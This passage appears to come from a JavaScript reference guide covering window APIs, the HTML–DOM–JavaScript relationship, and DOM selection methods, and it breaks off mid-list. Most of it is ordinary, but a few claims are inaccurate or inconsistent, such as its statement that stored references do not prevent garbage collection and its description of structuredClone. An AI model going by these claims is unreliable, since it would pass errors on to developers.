`window.setTimeout(callback, delay, ...args)` executes callback once after delay in milliseconds. Returns a timeout ID for cancellation with `clearTimeout(id)`. Minimum delay is typically 4ms for nested timeouts after the fifth level.

`window.setInterval(callback, delay, ...args)` executes callback repeatedly at specified intervals. Returns an interval ID for `clearInterval(id)`. Actual execution timing may drift due to event loop congestion.

`window.requestAnimationFrame(callback)` schedules callback before next repaint, providing the timestamp as an argument. Returns a request ID for `cancelAnimationFrame(id)`. Preferred for animations as it synchronizes with display refresh rate (typically 60Hz) and pauses when tab is hidden.

`window.requestIdleCallback(callback, options)` schedules callback during idle periods. The callback receives an `IdleDeadline` object with `timeRemaining()` method and `didTimeout` property. Cancel with `cancelIdleCallback(id)`.

### Dialog Methods

`window.alert(message)` displays a modal alert dialog blocking execution until dismissed.

`window.confirm(message)` shows a modal dialog with OK/Cancel buttons, returning boolean based on user choice.

`window.prompt(message, default)` displays input dialog returning entered string or `null` if cancelled.

`window.print()` opens the print dialog for the current document.

These methods are synchronous and block the main thread. Modern applications typically implement custom modal interfaces.

### Window Management

`window.open(url, target, features)` opens a new browsing context. The `target` parameter specifies where (`_blank`, `_self`, `_parent`, `_top`, or named window). The `features` parameter is a comma-separated string of window features (e.g., `"width=500,height=400,resizable=yes"`).

Returns a `WindowProxy` reference or `null` if blocked. Popup blockers typically prevent `window.open()` calls not directly triggered by user interaction.

`window.close()` closes the window if opened via script. Can only close windows opened by `window.open()` from the same origin.

`window.focus()` attempts to bring window to front and give it focus. `window.blur()` removes focus. Browsers restrict these for security and usability.

`window.moveTo(x, y)` and `window.moveBy(deltaX, deltaY)` reposition the window. `window.resizeTo(width, height)` and `window.resizeBy(deltaWidth, deltaHeight)` change dimensions. These methods are heavily restricted in modern browsers and typically only work on windows opened by script.

### Events and Event Handling

The window fires numerous events:

- `load` - fires when entire page including resources loads
- `DOMContentLoaded` - fires when DOM parsing completes (fires on document, not window)
- `beforeunload` - fires before unload, allows cancellation (return value or `event.returnValue`)
- `unload` - fires during unload
- `resize` - fires when window resizes
- `scroll` - fires when document scrolls
- `focus` / `blur` - fires when window gains/loses focus
- `hashchange` - fires when URL fragment changes
- `popstate` - fires on history navigation
- `online` / `offline` - fires when network connectivity changes
- `error` - fires for uncaught errors (provides error details)
- `unhandledrejection` - fires for unhandled promise rejections

Event listeners attach via `window.addEventListener(type, listener, options)` or legacy `window.on<event>` properties.

### Storage APIs

`window.localStorage` provides persistent key-value storage (typically 5-10MB limit) that survives browser restarts. Data is origin-specific and synchronous.

`window.sessionStorage` provides session-scoped storage that clears when tab/window closes. Otherwise identical API to localStorage.

Both implement the `Storage` interface:

- `setItem(key, value)` - stores value as string
- `getItem(key)` - retrieves value or null
- `removeItem(key)` - deletes entry
- `clear()` - removes all entries
- `key(index)` - returns key at index
- `length` - number of stored items

The `storage` event fires on other windows when storage changes, providing `key`, `oldValue`, `newValue`, `url`, and `storageArea` properties.

`window.indexedDB` provides access to the IndexedDB API for structured data storage with much larger capacity and asynchronous operations.

### Console and Debugging

`window.console` provides the Console API for debugging output:

- `console.log()`, `console.info()`, `console.warn()`, `console.error()` - output messages
- `console.table()` - displays tabular data
- `console.group()` / `console.groupEnd()` - creates collapsible groups
- `console.time()` / `console.timeEnd()` - measures execution time
- `console.trace()` - outputs stack trace
- `console.assert()` - conditional error output
- `console.clear()` - clears console

### Performance and Timing

`window.performance` provides the Performance API with timing and metrics:

- `performance.now()` - high-resolution timestamp (microsecond precision)
- `performance.timing` - navigation timing data (deprecated, use PerformanceNavigationTiming)
- `performance.navigation` - navigation type data (deprecated)
- `performance.getEntries()` - returns performance entries
- `performance.mark()` / `performance.measure()` - custom performance marks

`performance.now()` returns time elapsed since `timeOrigin` and is monotonically increasing, unaffected by system clock adjustments.

### Navigator and Environment

`window.navigator` provides information about the browser and environment:

- `navigator.userAgent` - user agent string
- `navigator.platform` - operating system
- `navigator.language` / `navigator.languages` - preferred languages
- `navigator.onLine` - network connectivity status
- `navigator.cookieEnabled` - cookie support
- `navigator.maxTouchPoints` - touch input support
- `navigator.hardwareConcurrency` - logical processor count
- `navigator.geolocation` - Geolocation API access
- `navigator.mediaDevices` - MediaDevices API access
- `navigator.serviceWorker` - ServiceWorker API access
- `navigator.clipboard` - Clipboard API access

### Encoding and Decoding

`window.atob(encodedData)` decodes Base64-encoded string to binary string.

`window.btoa(stringToEncode)` encodes binary string to Base64.

`window.encodeURI(uri)` encodes URI, preserving special URI characters.

`window.encodeURIComponent(component)` encodes URI component, encoding all special characters except `- _ . ! ~ * ' ( )`.

`window.decodeURI(encodedURI)` and `window.decodeURIComponent(encodedComponent)` perform reverse operations.

These functions work with Unicode strings; use TextEncoder/TextDecoder for proper UTF-8 handling with atob/btoa.

### Selection and Clipboard

`window.getSelection()` returns a `Selection` object representing user's text selection or caret position. Provides methods like `toString()`, `getRangeAt()`, `addRange()`, `removeAllRanges()`, `collapse()`, and `extend()`.

`window.getComputedStyle(element, pseudoElement)` returns `CSSStyleDeclaration` with computed styles for the element, reflecting actual rendered values after CSS cascade and inheritance.

### Messaging and Communication

`window.postMessage(message, targetOrigin, transfer)` enables safe cross-origin communication. Messages fire the `message` event on the receiving window with properties:

- `data` - the message payload
- `origin` - sender's origin
- `source` - reference to sender window
- `ports` - MessagePort array for channel messaging

Always validate `event.origin` before processing messages. The `targetOrigin` parameter specifies allowed receiver origin ("*" allows any, but is insecure).

### Observers and Mutations

`window.MutationObserver` constructor creates observers for DOM mutations. Configure with options like `childList`, `attributes`, `characterData`, `subtree`, `attributeOldValue`, and `attributeFilter`.

`window.ResizeObserver` constructor creates observers for element size changes. More efficient than polling with resize events.

`window.IntersectionObserver` constructor creates observers for element visibility changes relative to viewport or ancestor elements. Provides intersection ratios and bounding rectangles.

`window.PerformanceObserver` constructor creates observers for performance entries as they're recorded.

### Fetch and Network

`window.fetch(resource, options)` performs HTTP requests returning a Promise resolving to Response object. Modern replacement for XMLHttpRequest with cleaner API and Promise-based interface.

`window.WebSocket` constructor creates WebSocket connections for full-duplex communication. Events include `open`, `message`, `error`, and `close`.

### Custom Elements and Web Components

`window.customElements` provides the CustomElementRegistry for defining custom HTML elements:

- `define(name, constructor, options)` - registers custom element
- `get(name)` - retrieves constructor
- `whenDefined(name)` - returns Promise resolving when defined
- `upgrade(root)` - upgrades custom elements in tree

### Crypto and Security

`window.crypto` provides cryptographic functionality:

- `crypto.getRandomValues(typedArray)` - generates cryptographically strong random values
- `crypto.randomUUID()` - generates RFC 4122 UUID
- `crypto.subtle` - SubtleCrypto interface for advanced operations (encrypt, decrypt, sign, verify, digest, etc.)

### Animation and Visual Updates

`window.matchMedia(mediaQueryString)` returns `MediaQueryList` object for evaluating and monitoring media queries. Listen for changes via the `change` event or deprecated `addListener()` method.

### Global Constructors and Objects

The window object exposes all standard JavaScript constructors and objects as properties: `Object`, `Array`, `String`, `Number`, `Boolean`, `Function`, `Date`, `RegExp`, `Error`, `Promise`, `Map`, `Set`, `WeakMap`, `WeakSet`, `Symbol`, `Proxy`, `Reflect`, etc.

Web API constructors are also available: `XMLHttpRequest`, `WebSocket`, `Worker`, `SharedWorker`, `MessageChannel`, `Blob`, `File`, `FileReader`, `FormData`, `URL`, `URLSearchParams`, `Headers`, `Request`, `Response`, `ReadableStream`, `WritableStream`, `TextEncoder`, `TextDecoder`, `AbortController`, `AbortSignal`, and many others.

### Cross-Origin Restrictions

[Inference] Cross-origin access to window properties is restricted by the Same-Origin Policy. Cross-origin windows can only access a limited set of properties (`window.closed`, `window.location` write-only, `window.postMessage`) and methods. Attempts to access restricted properties throw SecurityError exceptions.

The `document.domain` property can be set to enable cross-origin access between subdomains of the same parent domain, though this approach is deprecated. CORS (Cross-Origin Resource Sharing) and postMessage provide modern alternatives.

### Deprecated and Legacy Features

`window.showModalDialog()` is obsolete and removed from modern browsers. Use custom modal implementations with dialog elements or libraries.

`window.captureEvents()` and `window.releaseEvents()` are legacy Netscape methods no longer functional.

`window.name` is a writable property that persists across navigations within the same window, historically used for cross-page communication before modern storage APIs.

`window.status` for setting status bar text is no longer functional in modern browsers due to security and usability concerns.

### Structured Cloning

The structured clone algorithm is used by several APIs (postMessage, MessageChannel, History API, IndexedDB) to serialize/deserialize complex objects including nested objects, Arrays, Dates, RegExps, Maps, Sets, typed arrays, and more. It cannot clone functions, DOM nodes, or objects with non-enumerable properties.

`window.structuredClone(value, options)` provides direct access to this algorithm for deep cloning objects.

---

## DOM vs HTML vs JavaScript Relationship

### The Three-Layer Model

HTML, the DOM, and JavaScript represent three distinct but interconnected layers in web development. HTML provides the declarative markup, the DOM serves as the live programming interface, and JavaScript acts as the manipulation language.

### HTML: The Static Source Document

HTML exists as a text-based markup language written in `.html` files or generated by servers. It defines the initial structure and content using tags like `<div>`, `<p>`, and `<img>`. The browser reads this text sequentially during parsing.

HTML itself has no runtime existence—once parsed, the browser discards the exact textual representation. What matters is not the HTML string but what the parser extracted from it.

### The DOM: The Live Object Representation

The DOM (Document Object Model) is a tree-structured, in-memory representation of the document. When a browser parses HTML, it constructs DOM nodes as language-agnostic objects following W3C specifications.

#### DOM Structure Characteristics

Each element becomes a node object with properties, methods, and parent-child relationships. A `<div id="container">` in HTML becomes a DOM object accessible as `document.getElementById('container')`, exposing properties like `.innerHTML`, `.style`, `.classList`, and methods like `.appendChild()`.

The DOM is **not** the HTML—it's a living structure that can differ significantly from the original markup:

- Browsers auto-correct malformed HTML (unclosed tags, improperly nested elements)
- JavaScript modifications change the DOM without touching the original HTML source
- The DOM includes nodes the browser generates (like `<tbody>` inserted automatically in tables)
- Comments, whitespace handling, and text nodes follow specific parsing rules that may not mirror the HTML exactly

#### DOM as a Language-Neutral API

The DOM specification defines interfaces independent of any programming language. While JavaScript is the primary DOM consumer in browsers, other languages (Python, Java) can manipulate DOM structures in different contexts (server-side rendering, web scraping).

### JavaScript: The Manipulation Language

JavaScript interacts exclusively with the DOM, never directly with HTML text. When you write `document.querySelector('.class')`, you're querying the DOM tree structure. When you modify `element.textContent`, you're changing a DOM node property.

#### JavaScript-DOM Interaction Patterns

**Reading from the DOM:**

```javascript
const element = document.querySelector('#myElement');
const text = element.textContent; // reads from DOM node
const hasClass = element.classList.contains('active'); // queries DOM state
```

**Writing to the DOM:**

```javascript
element.textContent = 'New text'; // updates DOM node
element.setAttribute('data-value', '42'); // modifies DOM attribute
element.style.color = 'red'; // changes DOM style property
```

**Creating DOM structures:**

```javascript
const newDiv = document.createElement('div'); // creates DOM node
newDiv.textContent = 'Content';
parent.appendChild(newDiv); // inserts into DOM tree
```

#### The innerHTML Exception

`innerHTML` appears to bridge HTML and DOM directly, but this is a controlled interface. When you set `element.innerHTML = '<p>Text</p>'`, the browser:

1. Receives an HTML string from JavaScript
2. Invokes the HTML parser on that string
3. Generates new DOM nodes
4. Replaces the element's children in the DOM tree

Reading `innerHTML` performs the reverse—serializing DOM nodes back into HTML text. This serialization may not match the original HTML due to normalization, attribute ordering, and void element handling.

### The Parsing Bridge

HTML parsing is the one-way bridge from HTML text to DOM structure. Modern browsers use tokenization followed by tree construction:

1. **Tokenization**: HTML text → tokens (start tags, end tags, text, comments)
2. **Tree Construction**: Tokens → DOM nodes with proper parent-child relationships
3. **Script Execution**: When `<script>` tags are encountered, JavaScript can access the partially-constructed DOM

#### Parse Timing and DOM Access

JavaScript executed during parsing can only access DOM nodes already constructed. This explains why scripts in the `<head>` cannot access `<body>` elements unless they use `defer`, `async`, or wait for `DOMContentLoaded`.

### Runtime Divergence

After initial parsing, the DOM and HTML source diverge permanently:

**User interactions** trigger DOM changes (form inputs update `.value` properties) without modifying the original HTML. **JavaScript mutations** add, remove, or modify nodes invisibly to the source. **CSS animations** can modify computed styles and trigger reflows without touching HTML or explicitly-set DOM properties.

The "View Source" feature shows the original HTTP response HTML. Browser DevTools show the **current DOM state**, which reflects all JavaScript modifications, auto-corrections, and dynamic changes.

### Virtual DOM Frameworks

React, Vue, and similar frameworks add another abstraction layer. They maintain a virtual representation separate from the real DOM, computing differences and selectively updating the actual DOM for performance. The relationship becomes:

HTML → Initial DOM ← JavaScript Framework ← Virtual DOM

The framework's JavaScript reconciles its virtual structure with the real DOM through targeted `appendChild`, `removeChild`, and property updates.

### Event Handling and the DOM

JavaScript event listeners attach to DOM nodes, not HTML elements. When you write:

```javascript
element.addEventListener('click', handler);
```

You're registering a callback on a DOM object. The event system operates entirely within the DOM—events propagate through the DOM tree (capture/bubble phases), and `event.target` references DOM nodes.

### Attribute vs Property Distinction

HTML attributes (in the markup) and DOM properties (on node objects) have a complex relationship:

- Some sync bidirectionally: `id`, `className`
- Some sync one-way: `value` (DOM property updates don't reflect back to the attribute)
- Some have different names: `class` attribute → `className` property
- Some exist only as properties: `textContent`, `innerHTML`
- Some exist only as attributes: custom `data-*` attributes (accessible via `dataset` property)

**[Inference]** This distinction causes frequent confusion because developers assume attributes and properties are identical, but the DOM specification defines different behaviors for different attribute-property pairs.

### Performance Implications

Understanding this relationship affects performance decisions:

**DOM access** is relatively expensive—each property read may trigger style recalculation or layout. **Batch DOM modifications** reduce reflows by minimizing tree mutations. **innerHTML** triggers full HTML parsing, while `textContent` directly sets a text node. **Document fragments** allow off-DOM tree construction before single insertion.

### Memory and References

DOM nodes are JavaScript objects with memory addresses. Multiple variables can reference the same node:

```javascript
const el1 = document.querySelector('#item');
const el2 = document.getElementById('item');
// el1 === el2 (same object reference)
```

Removing a node from the DOM tree doesn't destroy the object if JavaScript maintains references. This can cause memory leaks if event listeners or closures retain references to removed nodes.

### Shadow DOM Extension

The Shadow DOM extends this model by allowing encapsulated DOM subtrees attached to elements. A shadow root creates a separate DOM tree not accessible via normal traversal, maintaining the same object-based structure but with boundary enforcement for CSS and JavaScript access.

---

# Selecting Elements

## getElementById

### Method Signature

```javascript
document.getElementById(id)
```

Returns the `Element` object representing the element whose `id` property matches the specified string, or `null` if no matching element exists in the document.

### Parameters

**id** (string, required): Case-sensitive string representing the unique ID of the element to find. The ID must match exactly, including case.

### Return Value

- Returns an `Element` object if a matching element is found
- Returns `null` if no element with the specified ID exists
- Returns the first matching element if multiple elements share the same ID (though this violates HTML specifications)

### Behavior Characteristics

#### Scope and Context

The method searches only within the document context where it's called. It traverses the entire DOM tree starting from the document root, regardless of where elements are nested.

#### ID Uniqueness Requirement

HTML specifications require IDs to be unique within a document. While browsers don't enforce this programmatically, `getElementById` behavior with duplicate IDs is undefined in the specification. In practice, most browsers return the first element encountered in document order.

#### Performance Profile

`getElementById` is highly optimized in modern browsers. Browsers maintain internal hash maps of element IDs, making lookups O(1) complexity rather than requiring full DOM traversal. This makes it one of the fastest DOM selection methods available.

### Common Patterns

#### Null Checking

```javascript
const element = document.getElementById('myElement');
if (element) {
  // Element exists, safe to manipulate
  element.style.color = 'red';
}
```

#### Direct Property Access

```javascript
const input = document.getElementById('username');
const value = input.value;
const isChecked = input.checked;
```

#### Event Listener Attachment

```javascript
const button = document.getElementById('submitBtn');
button.addEventListener('click', handleClick);
```

#### Chaining Method Calls

```javascript
document.getElementById('container')?.classList.add('active');
```

### Edge Cases and Gotchas

#### Invalid ID Characters

IDs containing special characters must match exactly in the selector string:

```javascript
// HTML: <div id="item:123"></div>
document.getElementById('item:123'); // Works
```

No escaping is needed for `getElementById` unlike CSS selectors, since it performs exact string matching.

#### Dynamic ID Generation

When working with dynamically generated IDs:

```javascript
const index = 5;
const element = document.getElementById(`item-${index}`);
```

#### Case Sensitivity

```javascript
// HTML: <div id="MyElement"></div>
document.getElementById('MyElement');  // Found
document.getElementById('myelement');  // null - case matters
```

#### Timing Issues

Calling `getElementById` before the DOM is fully loaded returns `null`:

```javascript
// Will fail if element hasn't been parsed yet
const early = document.getElementById('footer');

// Solution 1: DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
  const element = document.getElementById('footer');
});

// Solution 2: defer/async script placement
// Solution 3: Place script before </body>
```

### Comparison with Other Selection Methods

#### vs querySelector

```javascript
document.getElementById('myId');           // Faster, ID-specific
document.querySelector('#myId');           // More flexible syntax, slower
```

`getElementById` is approximately 2-3x faster than `querySelector` for ID lookups due to direct hash map access versus CSS selector parsing.

#### vs getElementsByClassName/TagName

```javascript
document.getElementById('unique');              // Single element, fast
document.getElementsByClassName('item')[0];     // Live HTMLCollection, slower
```

#### vs querySelectorAll

```javascript
document.getElementById('item');          // Returns element or null
document.querySelectorAll('#item')[0];    // Returns NodeList (static)
```

### Memory and Reference Management

The returned `Element` object is a live reference to the DOM node. Changes to the element through this reference immediately reflect in the rendered page:

```javascript
const div = document.getElementById('container');
div.textContent = 'Updated'; // Immediately updates display
```

Storing references doesn't prevent garbage collection if the element is removed from the DOM, but the reference remains accessible until explicitly released.

### Integration with Modern Frameworks

#### React

```javascript
// Ref-based approach (preferred)
const myRef = useRef(null);
<div ref={myRef}></div>

// Direct getElementById (discouraged in React)
useEffect(() => {
  const element = document.getElementById('external');
}, []);
```

#### Vue

```javascript
// Template ref (preferred)
<div ref="myElement"></div>
this.$refs.myElement

// Direct access still works for external elements
mounted() {
  const external = document.getElementById('non-vue-element');
}
```

### Security Considerations

#### XSS Prevention

Never use unsanitized user input to construct IDs:

```javascript
// Vulnerable
const userId = getUserInput();
const element = document.getElementById(userId);

// [Inference] An attacker could inject IDs that reference sensitive elements
```

#### ID Enumeration

Exposing predictable ID patterns may leak information about application structure:

```javascript
// Potentially revealing
document.getElementById('admin-panel-' + id);
```

### Browser Compatibility

Supported in all browsers including Internet Explorer 5.5+. The method signature and behavior have remained consistent across all major browser versions, making it one of the most reliable DOM APIs.

### Performance Optimization Tips

#### Cache Element References

```javascript
// Inefficient - multiple lookups
for (let i = 0; i < 1000; i++) {
  document.getElementById('status').textContent = i;
}

// Efficient - single lookup
const status = document.getElementById('status');
for (let i = 0; i < 1000; i++) {
  status.textContent = i;
}
```

#### Batch DOM Modifications

```javascript
const container = document.getElementById('list');
const fragment = document.createDocumentFragment();
// Add items to fragment
container.appendChild(fragment); // Single reflow
```

---

## getElementsByClassName

### Method Signature and Return Value

```javascript
document.getElementsByClassName(classNames)
element.getElementsByClassName(classNames)
```

Returns a live `HTMLCollection` of elements with the specified class name(s). The collection updates automatically when the DOM changes.

### Multiple Class Selection

Pass space-separated class names to match elements containing all specified classes:

```javascript
// Matches elements with both "card" AND "active" classes
const activeCards = document.getElementsByClassName('card active');
```

Order doesn't matter - `'card active'` and `'active card'` produce identical results.

### Live Collection Behavior

The returned `HTMLCollection` reflects real-time DOM state:

```javascript
const items = document.getElementsByClassName('item');
console.log(items.length); // 3

document.querySelector('.item').remove();
console.log(items.length); // 2 - automatically updated
```

**[Inference]** This live behavior can cause issues in loops that modify the DOM:

```javascript
// Problematic - collection shrinks as elements are removed
const items = document.getElementsByClassName('item');
for (let i = 0; i < items.length; i++) {
    items[i].remove(); // Only removes every other element
}

// Solution: Convert to static array
const items = Array.from(document.getElementsByClassName('item'));
for (let item of items) {
    item.remove(); // Works correctly
}
```

### Scope Limitation

Called on an element, it searches only within that element's descendants:

```javascript
const container = document.getElementById('sidebar');
const buttons = container.getElementsByClassName('btn');
// Only finds .btn elements inside #sidebar
```

### HTMLCollection Interface

The returned collection is array-like but not an actual Array:

```javascript
const elements = document.getElementsByClassName('box');

// Available methods/properties:
elements.length          // Number of elements
elements.item(0)         // Get element by index
elements[0]              // Bracket notation also works
elements.namedItem('id') // Get element by id attribute

// NOT available (Array methods):
elements.forEach()  // undefined
elements.map()      // undefined
elements.filter()   // undefined
```

Convert to Array for full array functionality:

```javascript
Array.from(elements).forEach(el => console.log(el));
[...elements].map(el => el.textContent);
```

### Performance Characteristics

**[Inference]** `getElementsByClassName` is generally faster than `querySelectorAll` because it doesn't parse CSS selectors and returns a live collection without creating a snapshot. However, the live collection can have performance implications if the DOM changes frequently during iteration.

```javascript
// Faster for simple class selection
const fast = document.getElementsByClassName('item');

// Slower but more flexible
const flexible = document.querySelectorAll('.item');
```

### Case Sensitivity

Class names are case-sensitive in HTML5:

```javascript
// These are different:
document.getElementsByClassName('MyClass');
document.getElementsByClassName('myclass');
```

### Browser Compatibility

Supported in all modern browsers and IE9+. No polyfill needed for standard web development.

### Common Pitfalls

**Modifying classes during iteration:**

```javascript
const elements = document.getElementsByClassName('old');
// This breaks because collection updates as classes change:
for (let el of elements) {
    el.classList.remove('old');
    el.classList.add('new');
}

// Solution: convert to static array first
const elementsArray = Array.from(document.getElementsByClassName('old'));
for (let el of elementsArray) {
    el.classList.remove('old');
    el.classList.add('new');
}
```

**Assuming Array methods exist:**

```javascript
// Error: getElementsByClassName(...).forEach is not a function
document.getElementsByClassName('item').forEach(el => {
    console.log(el);
});

// Correct:
Array.from(document.getElementsByClassName('item')).forEach(el => {
    console.log(el);
});
```

### Comparison with Alternatives

**vs querySelector/querySelectorAll:**

- `getElementsByClassName` returns live collection; `querySelectorAll` returns static NodeList
- `getElementsByClassName` limited to class selection; `querySelectorAll` accepts any CSS selector
- `querySelectorAll` NodeList has `forEach` method; HTMLCollection does not

**vs getElementById:**

- `getElementById` returns single element or null; `getElementsByClassName` returns collection
- `getElementById` only works on document; `getElementsByClassName` works on any element

**vs getElementsByTagName:**

- Same return type (live HTMLCollection)
- Different selection criteria (tag vs class)

### Practical Use Cases

**Event delegation setup:**

```javascript
const buttons = document.getElementsByClassName('dynamic-btn');
// Convert to array to safely iterate
Array.from(buttons).forEach(btn => {
    btn.addEventListener('click', handleClick);
});
```

**Batch styling:**

```javascript
const highlights = document.getElementsByClassName('highlight');
for (let el of highlights) {
    el.style.backgroundColor = 'yellow';
}
```

**Conditional rendering:**

```javascript
const errors = document.getElementsByClassName('error-message');
if (errors.length > 0) {
    document.getElementById('error-summary').style.display = 'block';
}
```

---

## getElementsByTagName

### Method Signature and Return Value

```javascript
document.getElementsByTagName(tagName)
element.getElementsByTagName(tagName)
```

Returns a live `HTMLCollection` of elements with the specified tag name. The collection is ordered in document tree order (depth-first pre-order traversal). The returned collection is **live**, meaning it automatically updates when the DOM changes.

### Tag Name Matching

The `tagName` parameter is case-insensitive in HTML documents but case-sensitive in XML documents.

```javascript
// These are equivalent in HTML documents
document.getElementsByTagName('div')
document.getElementsByTagName('DIV')
document.getElementsByTagName('Div')

// In XML documents, only exact case matches work
```

The special value `"*"` returns all elements in the document or within the specified element.

```javascript
// Get all elements in the document
const allElements = document.getElementsByTagName('*');
```

### HTMLCollection Characteristics

The returned `HTMLCollection` is **array-like** but not an actual array:

```javascript
const divs = document.getElementsByTagName('div');

// Has length property
console.log(divs.length);

// Supports bracket notation
const firstDiv = divs[0];

// Supports item() method
const secondDiv = divs.item(1);

// Does NOT have array methods (forEach, map, filter, etc.)
// divs.forEach() // TypeError

// Convert to array for array methods
Array.from(divs).forEach(div => {
  // process each div
});

[...divs].map(div => div.textContent);
```

### Live Collection Behavior

The live nature of `HTMLCollection` has significant performance and behavioral implications:

```javascript
const divs = document.getElementsByTagName('div');
console.log(divs.length); // e.g., 5

// Add a new div to the document
const newDiv = document.createElement('div');
document.body.appendChild(newDiv);

console.log(divs.length); // Now 6 - automatically updated

// Remove a div
document.body.removeChild(document.body.firstElementChild);
console.log(divs.length); // Decremented automatically
```

**Common pitfall with live collections:**

```javascript
const divs = document.getElementsByTagName('div');

// This creates an infinite loop!
for (let i = 0; i < divs.length; i++) {
  const newDiv = document.createElement('div');
  document.body.appendChild(newDiv);
  // divs.length keeps increasing!
}

// Safe approach: convert to static array first
const divsArray = Array.from(divs);
for (let i = 0; i < divsArray.length; i++) {
  const newDiv = document.createElement('div');
  document.body.appendChild(newDiv);
}
```

### Scope and Context

Can be called on `document` or any `Element`:

```javascript
// Search entire document
const allParagraphs = document.getElementsByTagName('p');

// Search within specific element
const container = document.getElementById('container');
const paragraphsInContainer = container.getElementsByTagName('p');

// Chain with other DOM methods
const firstDiv = document.getElementsByTagName('div')[0];
const spansInFirstDiv = firstDiv.getElementsByTagName('span');
```

### Performance Considerations

**Caching the collection:**

```javascript
// Poor: queries DOM on every iteration
for (let i = 0; i < document.getElementsByTagName('div').length; i++) {
  // process
}

// Better: cache the collection
const divs = document.getElementsByTagName('div');
for (let i = 0; i < divs.length; i++) {
  // process
}

// Best for performance if the collection won't change: cache length too
const divs = document.getElementsByTagName('div');
const len = divs.length;
for (let i = 0; i < len; i++) {
  // process
}
```

**Live vs. static considerations:**

[Inference] Live collections may have slightly slower performance for repeated access compared to static `NodeList` objects because they must query the DOM state on each access, though modern browsers optimize this heavily.

### Comparison with Similar Methods

#### vs. querySelectorAll()

```javascript
// getElementsByTagName - returns live HTMLCollection
const divs1 = document.getElementsByTagName('div');

// querySelectorAll - returns static NodeList
const divs2 = document.querySelectorAll('div');

// Key differences:
// 1. Live vs. static
// 2. HTMLCollection vs. NodeList
// 3. getElementsByTagName is faster for simple tag queries
// 4. querySelectorAll is more flexible (any CSS selector)
```

[Inference] For simple tag name queries, `getElementsByTagName` is typically faster than `querySelectorAll` due to its more specialized nature, though the difference is often negligible in practice.

#### vs. getElementsByClassName()

```javascript
// Get by tag name
const divs = document.getElementsByTagName('div');

// Get by class name
const highlighted = document.getElementsByClassName('highlight');

// Both return live HTMLCollection
// Can be combined by converting and filtering
const highlightedDivs = Array.from(divs).filter(div => 
  div.classList.contains('highlight')
);
```

#### vs. children/childNodes

```javascript
const parent = document.getElementById('parent');

// Only direct children elements (live HTMLCollection)
const directChildren = parent.children;

// All direct child nodes including text nodes (live NodeList)
const allChildren = parent.childNodes;

// All descendant divs (live HTMLCollection)
const allDescendantDivs = parent.getElementsByTagName('div');
```

### Practical Use Cases

**Manipulating multiple elements:**

```javascript
const images = document.getElementsByTagName('img');
for (let i = 0; i < images.length; i++) {
  images[i].loading = 'lazy';
  images[i].alt = images[i].alt || 'Image';
}
```

**Counting specific elements:**

```javascript
const linkCount = document.getElementsByTagName('a').length;
const headingCount = document.getElementsByTagName('h2').length;
```

**Scoped searches in dynamic content:**

```javascript
function processNewSection(sectionElement) {
  const links = sectionElement.getElementsByTagName('a');
  for (let i = 0; i < links.length; i++) {
    links[i].target = '_blank';
    links[i].rel = 'noopener noreferrer';
  }
}
```

### Edge Cases and Gotchas

**Namespace-qualified tags in XML/XHTML:**

```javascript
// In XML documents with namespaces
// getElementsByTagName uses local name only
const svgCircles = svgElement.getElementsByTagName('circle');

// For namespace-aware selection, use getElementsByTagNameNS
const circles = svgElement.getElementsByTagNameNS('http://www.w3.org/2000/svg', 'circle');
```

**Empty collections are truthy:**

```javascript
const spans = document.getElementsByTagName('span');

// Even if no spans exist, this is truthy!
if (spans) {
  console.log('This always runs');
}

// Check length instead
if (spans.length > 0) {
  console.log('Spans exist');
}
```

**Index access can return undefined:**

```javascript
const divs = document.getElementsByTagName('div');
const tenth = divs[9]; // undefined if fewer than 10 divs exist
```

### Browser Compatibility

Supported in all browsers including IE5+. The method is part of the DOM Level 1 specification and has universal support. The `"*"` parameter is supported in all modern browsers and IE6+.

### Modern Alternatives

Modern code often prefers:

```javascript
// For static collections
document.querySelectorAll('div')

// For single elements
document.querySelector('div')

// For more complex selections
document.querySelectorAll('div.active[data-type="primary"]')
```

However, `getElementsByTagName` remains valid for:

- Cases where live collections are specifically needed
- Performance-critical simple tag selections
- Legacy code maintenance

---

## querySelector

### Syntax and Return Value

`querySelector()` returns the first Element within the document that matches the specified CSS selector or group of selectors. Returns `null` if no matches are found. The method performs a depth-first pre-order traversal of the document's nodes.

```javascript
element = document.querySelector(selectors);
element = parentElement.querySelector(selectors);
```

The `selectors` parameter is a DOMString containing one or more CSS selectors separated by commas. If the selector string contains invalid CSS syntax, a `SyntaxError` DOMException is thrown.

### Selector Specificity and Matching Behavior

The method matches against the full selector string, not individual components. This means complex selectors with combinators, pseudo-classes, and attribute selectors work as expected:

```javascript
// Matches first paragraph inside any div with class "content"
document.querySelector('div.content > p');

// Matches first checked checkbox
document.querySelector('input[type="checkbox"]:checked');

// Matches first element with data attribute
document.querySelector('[data-id="123"]');
```

When multiple selectors are provided (comma-separated), `querySelector` returns the first element in document order that matches _any_ of the selectors, not necessarily the first selector in the list:

```javascript
// Returns whichever comes first in DOM order
document.querySelector('.primary, .secondary, #special');
```

### Scope and Context

Unlike `querySelectorAll`, which can be called on any Element, `querySelector` is available on:

- `Document` objects (`document.querySelector`)
- `Element` objects (scopes search to descendants)
- `DocumentFragment` objects

When called on an element, the search is scoped to that element's descendants only:

```javascript
const container = document.getElementById('container');
// Only searches within #container
const nested = container.querySelector('.nested-item');
```

### Performance Characteristics

`querySelector` stops traversing as soon as the first match is found, making it more efficient than `querySelectorAll` when only one element is needed. However, it's still slower than direct access methods for simple queries:

**Performance hierarchy (fastest to slowest):**

1. `getElementById()` - O(1) hash lookup
2. `getElementsByClassName()`, `getElementsByTagName()` - Optimized internal collections
3. `querySelector()` - Full CSS selector parsing and matching
4. `querySelectorAll()` - Must traverse entire subtree

```javascript
// Fastest for IDs
document.getElementById('myId');

// Slower, but more flexible
document.querySelector('#myId');

// Much slower for simple class lookups
document.querySelector('.myClass');
// Faster alternative
document.getElementsByClassName('myClass')[0];
```

### Complex Selector Patterns

#### Pseudo-classes and Pseudo-elements

Most CSS pseudo-classes work, but pseudo-elements (`:before`, `::after`) cannot be selected as they're not part of the DOM:

```javascript
// Valid pseudo-classes
document.querySelector('input:focus');
document.querySelector('li:nth-child(3)');
document.querySelector('p:not(.excluded)');
document.querySelector('a:hover'); // Only matches if actually hovered

// Pseudo-elements throw errors or return null
document.querySelector('div::before'); // Invalid
```

#### Attribute Selectors

Full CSS attribute selector syntax is supported:

```javascript
// Exact match
document.querySelector('[data-type="user"]');

// Contains word
document.querySelector('[class~="active"]');

// Starts with
document.querySelector('[href^="https://"]');

// Ends with
document.querySelector('[src$=".png"]');

// Contains substring
